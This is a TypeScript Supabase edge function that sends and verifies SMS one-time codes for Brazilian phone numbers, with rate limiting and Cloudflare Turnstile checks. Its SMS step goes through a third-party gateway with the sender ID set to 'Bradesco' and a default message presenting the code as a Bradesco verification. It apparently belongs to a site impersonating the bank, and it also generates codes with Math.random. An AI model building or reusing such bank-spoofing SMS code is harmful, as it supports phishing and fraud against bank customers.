import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { rateLimit, getClientIp } from "../_shared/rate-limiter.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

// Module-level client — reused across warm invocations (conn-connection-pooling).
const supabase = createClient(
  Deno.env.get("SUPABASE_URL")!,
  Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
);

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const ip = getClientIp(req);
    const RISENEW_API_KEY = Deno.env.get("RISENEW_API_KEY");
    const RISENEW_API_SECRET = Deno.env.get("RISENEW_API_SECRET");
    if (!RISENEW_API_KEY || !RISENEW_API_SECRET) throw new Error("RISENEW credentials are not configured");

    const body = await req.json();
    const { phone, action, code, turnstileToken } = body;

    if (!phone || typeof phone !== "string") {
      return new Response(
        JSON.stringify({ error: "Número de telefone é obrigatório" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Normalize: strip non-digits, remove 55 country code if already present
    let cleanPhone = phone.replace(/\D/g, "");
    if (cleanPhone.startsWith("55") && cleanPhone.length > 11) {
      cleanPhone = cleanPhone.slice(2);
    }
    if (cleanPhone.length < 10 || cleanPhone.length > 11) {
      return new Response(
        JSON.stringify({ error: "Número de telefone inválido" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    if (action === "send") {
      // Rate limit: 3 OTP sends per 5 min per IP
      const sendLimited = rateLimit(`otp-send:${ip}`, 3, 5 * 60 * 1000);
      if (sendLimited) return sendLimited;

      // Verify Turnstile on first OTP send; resends are allowed if a recent OTP exists
      const TURNSTILE_SECRET = Deno.env.get("TURNSTILE_SECRET_KEY");
      if (TURNSTILE_SECRET) {
        // Check if this is a resend (recent OTP exists for this phone)
        const { data: existingOtp } = await supabase
          .from("otp_codes")
          .select("id")
          .eq("phone", cleanPhone)
          .gte("expires_at", new Date().toISOString())
          .limit(1);
        const isResend = existingOtp && existingOtp.length > 0;

        if (!isResend) {
          // First send — require Turnstile
          if (!turnstileToken || typeof turnstileToken !== "string") {
            return new Response(
              JSON.stringify({ error: "Verificação de segurança obrigatória." }),
              { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
            );
          }
          const verifyRes = await fetch(
            "https://challenges.cloudflare.com/turnstile/v0/siteverify",
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ secret: TURNSTILE_SECRET, response: turnstileToken }),
            }
          );
          const verifyData = await verifyRes.json();
          if (!verifyData.success) {
            console.warn("Turnstile rejected in OTP send:", verifyData["error-codes"]);
            return new Response(
              JSON.stringify({ error: "Verificação de segurança inválida. Recarregue a página." }),
              { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
            );
          }
        }
      }

      const otpCode = String(Math.floor(100000 + Math.random() * 900000));
      const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();

      // Delete old codes for this phone
      await supabase.from("otp_codes").delete().eq("phone", cleanPhone);

      // Insert new code
      const { error: insertError } = await supabase.from("otp_codes").insert({
        phone: cleanPhone,
        code: otpCode,
        expires_at: expiresAt,
      });

      if (insertError) {
        console.error("DB insert error:", insertError);
        throw new Error("Erro ao salvar código");
      }

      // Fetch OTP SMS template from admin config
      let message = `Seu codigo de verificacao Bradesco: ${otpCode}. Valido por 5 minutos.`;
      try {
        const { data: tplRow } = await supabase
          .from("access_config")
          .select("config_value")
          .eq("config_key", "otp_sms_template")
          .maybeSingle();
        if (tplRow?.config_value) {
          const tpl = typeof tplRow.config_value === "string" ? tplRow.config_value : String(tplRow.config_value);
          message = tpl.replace(/\{\{codigo\}\}/g, otpCode);
        }
      } catch (e) {
        console.warn("Failed to fetch OTP template, using default:", e);
      }

      // E.164 format: +55 + DDD + number (e.g. +5511999999999)
      const fullPhone = `+55${cleanPhone}`;
      const smsUrl = `https://api.risenew.lat/sms/single_send?key=${encodeURIComponent(RISENEW_API_KEY)}&secret=${encodeURIComponent(RISENEW_API_SECRET)}&from=Bradesco&to=${encodeURIComponent(fullPhone)}&text=${encodeURIComponent(message)}`;

      const smsResponse = await fetch(smsUrl);
      const smsData = await smsResponse.json().catch(() => ({}));
      console.log("Risenew OTP response [to=%s]:", fullPhone, JSON.stringify(smsData));

      if (!smsResponse.ok || smsData.success === false) {
        throw new Error(`Risenew API error: ${smsData.error || JSON.stringify(smsData)}`);
      }

      return new Response(
        JSON.stringify({ success: true, message: "Código enviado com sucesso" }),
        { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    if (action === "verify") {
      // Rate limit: 10 verify attempts per 5 min per IP
      const verifyLimited = rateLimit(`otp-verify:${ip}`, 10, 5 * 60 * 1000);
      if (verifyLimited) return verifyLimited;

      if (!code || typeof code !== "string") {
        return new Response(
          JSON.stringify({ error: "Código é obrigatório" }),
          { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }

      // Find valid OTP
      const { data: rows, error: selectError } = await supabase
        .from("otp_codes")
        .select("*")
        .eq("phone", cleanPhone)
        .eq("verified", false)
        .gte("expires_at", new Date().toISOString())
        .order("created_at", { ascending: false })
        .limit(1);

      if (selectError) {
        console.error("DB select error:", selectError);
        throw new Error("Erro ao verificar código");
      }

      if (!rows || rows.length === 0) {
        return new Response(
          JSON.stringify({ valid: false, error: "Código expirado ou não encontrado. Solicite um novo." }),
          { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }

      const storedOtp = rows[0];

      const MAX_ATTEMPTS = 5;

      // Blocked after too many wrong attempts
      if ((storedOtp.attempts ?? 0) >= MAX_ATTEMPTS) {
        await supabase.from("otp_codes").delete().eq("id", storedOtp.id);
        return new Response(
          JSON.stringify({ valid: false, error: "Muitas tentativas incorretas. Solicite um novo código." }),
          { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }

      if (storedOtp.code !== code) {
        const newAttempts = (storedOtp.attempts ?? 0) + 1;
        await supabase.from("otp_codes").update({ attempts: newAttempts }).eq("id", storedOtp.id);
        const remaining = MAX_ATTEMPTS - newAttempts;
        const msg = remaining > 0
          ? `Código incorreto. ${remaining} tentativa${remaining === 1 ? "" : "s"} restante${remaining === 1 ? "" : "s"}.`
          : "Muitas tentativas incorretas. Solicite um novo código.";
        if (remaining <= 0) {
          await supabase.from("otp_codes").delete().eq("id", storedOtp.id);
        }
        return new Response(
          JSON.stringify({ valid: false, error: msg }),
          { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }

      // Mark as verified and clean up
      await supabase.from("otp_codes").update({ verified: true }).eq("id", storedOtp.id);

      return new Response(
        JSON.stringify({ valid: true, message: "Telefone verificado com sucesso" }),
        { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    return new Response(
      JSON.stringify({ error: "Ação inválida. Use 'send' ou 'verify'." }),
      { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (error) {
    console.error("OTP error:", error);
    return new Response(
      JSON.stringify({ error: "Erro interno ao processar OTP" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
